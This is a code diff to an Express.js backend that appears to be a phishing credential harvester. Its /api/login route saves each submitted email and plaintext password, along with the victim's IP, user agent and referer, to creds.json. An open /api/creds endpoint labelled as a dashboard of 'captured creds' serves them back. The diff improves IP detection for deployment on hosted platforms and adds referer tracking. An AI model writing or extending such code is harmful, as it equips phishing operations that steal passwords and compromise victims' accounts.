@@ -11,18 +11,29 @@ app.use(express.static('../client'));
 
 // Creds storage
 const credsPath = path.join(__dirname, 'uploads', 'creds.json');
-
 const uploadsDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadsDir)) {
   fs.mkdirSync(uploadsDir, { recursive: true });
 }
 
+// Robust IP detection for local + deployed (Render/Vercel)
 const getClientIP = (req) => {
-  return req.headers['x-forwarded-for'] ||  // Proxy (Render/Vercel)
-         req.headers['x-real-ip'] ||       // Nginx proxy
-         req.connection.remoteAddress ||   // Direct
-         req.socket.remoteAddress ||       // Socket
-         req.ip ||                         // Express
+  // Proxy/CDN headers (Render, Vercel, Cloudflare)
+  const forwarded = req.headers['x-forwarded-for'];
+  if (forwarded) {
+    return Array.isArray(forwarded) 
+      ? forwarded[0].split(',')[0].trim()
+      : forwarded.split(',')[0].trim();
+  }
+  
+  // Other proxy headers
+  if (req.headers['x-real-ip']) return req.headers['x-real-ip'];
+  if (req.headers['x-client-ip']) return req.headers['x-client-ip'];
+  
+  // Direct connection fallbacks
+  return req.connection.remoteAddress ||
+         req.socket.remoteAddress ||
+         req.ip ||
          'unknown';
 };
 
@@ -35,6 +46,7 @@ app.post('/api/login', (req, res) => {
     const cred = {
       timestamp: new Date().toISOString(),
       ip: getClientIP(req),
+      referer: req.get('Referer') || 'direct',
       email: email.trim(),
       password: pass,
       userAgent: req.get('User-Agent')?.substring(0, 200) || 'unknown'
@@ -60,12 +72,12 @@ app.post('/api/login', (req, res) => {
 // DASHBOARD - View captured creds
 app.get('/api/creds', (req, res) => {
   const creds = fs.existsSync(credsPath)
-    ? JSON.parse(fs.readFileSync(credsPath, 'utf8')) 
+    ? JSON.parse(fs.readFileSync(credsPath, 'utf8'))
     : [];
   res.json(creds);
 });
 
 app.listen(5000, () => {
   console.log('🔥 Backend: http://localhost:5000');
-  console.log('📁 Creds saved to:', credsPath);
+  console.log('📁 Creds path:', credsPath);
 });
